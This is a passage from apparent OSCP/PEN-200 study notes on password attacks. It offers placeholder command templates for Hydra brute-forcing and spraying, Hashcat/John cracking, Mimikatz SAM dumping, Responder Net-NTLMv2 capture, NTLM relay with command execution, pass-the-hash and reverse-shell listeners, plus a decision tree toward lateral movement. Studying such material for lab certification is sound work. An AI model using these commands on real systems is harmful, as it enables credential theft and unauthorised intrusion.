impacket-wmiexec -hashes <LMHash>:<NTHash> <user>@<target>
```

When no LM hash is available:

```text
00000000000000000000000000000000
```

---

## Responder

Purpose: receive/capture Windows network authentication.

```bash
sudo responder -I <interface>
```

Then induce a Windows SMB request:

```cmd
dir \\<kali-ip>\<anything>
```

---

## Impacket ntlmrelayx

Purpose: relay live NTLM/Net-NTLM authentication to another target.

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "<command>"
```

---

## Netcat

Connect to a bind shell:

```bash
nc <target> <port>
```

Listen for a reverse shell:

```bash
nc -nvlp <port>
```

---

# OSCP decision tree

```text
Found login service?
│
├─ Known username?
│  └─ Try focused dictionary attack carefully
│
├─ Known password?
│  └─ Consider password spraying / credential reuse
│
└─ Web form?
   └─ Burp → identify POST body + failure string → Hydra

Found a hash or protected credential file?
│
├─ Identify/convert format
├─ Determine Hashcat/JtR mode
├─ Estimate feasibility
├─ Build targeted wordlist/rules
└─ Crack offline

Windows local admin/SYSTEM?
│
├─ Mimikatz → SAM/LSASS credential material
├─ Crack NTLM
└─ If cracking fails → consider pass-the-hash

Windows unprivileged shell?
│
├─ Coerce SMB auth to Responder
├─ Capture Net-NTLMv2
├─ Crack with mode 5600
└─ If cracking fails → consider relay

Recovered plaintext/hash?
│
├─ Validate
├─ Reuse carefully on relevant services/hosts
├─ Look for lateral movement
└─ Record proof and credential provenance
```

---

# Common pitfalls

> [!warning] Online attack noise
> Hydra can create many authentication events and may lock accounts. Check lockout policies and scope before broad attacks.

> [!warning] Wrong Hashcat mode
> A hash-looking string is not enough to determine the algorithm reliably. Use context and multiple identification methods.

> [!warning] Bad formatting
> Transformation tools may prepend filenames/usernames. Hashcat may require those prefixes removed.

> [!warning] Shell quoting
> Hashcat rules contain `$`, which the shell may interpret. Escape it when writing rules with `echo`.

> [!warning] SSH key permissions
> Before using a downloaded private key:
>
> ```bash
> chmod 600 id_rsa
> ```

> [!warning] Tool limitations
> Hashcat and JtR do not support exactly the same formats/ciphers. A Hashcat parsing error does not necessarily mean the credential cannot be cracked.

> [!warning] NTLM vs Net-NTLMv2
> `-m 1000` is NTLM; `-m 5600` is Net-NTLMv2. They are not interchangeable.

> [!warning] PtH/relay privileges
> Successful authentication does not automatically equal remote code execution. Administrative rights and Windows UAC remote restrictions matter.

---

# Mini cheat sheet — Chapter 13

These are the commands/reminders most useful to keep beside you while solving a PEN-200 machine.

```bash
# 1. Verify a login service
sudo nmap -sV -p <port> <target>

# 2. Decompress rockyou if necessary
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# 3. Hydra: one user, many passwords
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target>

# 4. Hydra: spray one password across users
hydra -L users.txt -p '<password>' rdp://<target>

# 5. Hydra HTTP POST form
hydra -l <user> -P <wordlist> <target> \
http-post-form "/login:path_user=<user>&path_pass=^PASS^:<failure-string>"

# 6. Hashcat benchmark
hashcat -b

# 7. Identify Hashcat modes quickly
hashcat --help | grep -i "<keyword>"

# 8. Preview rule mutations
hashcat -r rules.rule --stdout wordlist.txt

# 9. Generic Hashcat rule attack
hashcat -m <mode> hashes.txt wordlist.txt -r rules.rule

# 10. KeePass -> crackable hash
keepass2john Database.kdbx > keepass.hash

# 11. SSH private key -> crackable hash
ssh2john id_rsa > ssh.hash

# 12. John with custom rules
john --wordlist=wordlist.txt --rules=<RuleName> hash.txt

# 13. Secure and use an SSH private key
chmod 600 id_rsa
ssh -i id_rsa -p <port> <user>@<target>

# 14. Mimikatz SAM extraction
privilege::debug
token::elevate
lsadump::sam

# 15. Crack NTLM
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule

# 16. Pass NTLM with Impacket
impacket-psexec -hashes \
00000000000000000000000000000000:<NTHash> <user>@<target>

# 17. Capture Net-NTLMv2
sudo responder -I <interface>
# On Windows:
dir \\<kali-ip>\test

# 18. Crack Net-NTLMv2
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt

# 19. Relay SMB authentication
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "<command>"

# 20. Reverse-shell listener
nc -nvlp <port>
```

## Final reminders

- Enumerate first; do not blindly brute-force.
- Reuse every recovered plaintext password thoughtfully across relevant hosts/services.
- Prefer offline cracking when a hash is available.
- Build rules from **human behavior + password policy**.
- `Hashcat error` does not mean `uncrackable`; try JtR when format/cipher support differs.
- After obtaining an NTLM hash, consider both **crack** and **pass-the-hash**.
- After capturing Net-NTLMv2, consider both **crack** and **relay**.
- Validate recovered credentials and record the path that produced them.
- Windows UAC remote restrictions can make valid local-admin credentials insufficient for remote code execution.
- In an OSCP workflow, credentials are often the bridge between **initial access → lateral movement → AD compromise → proof**.
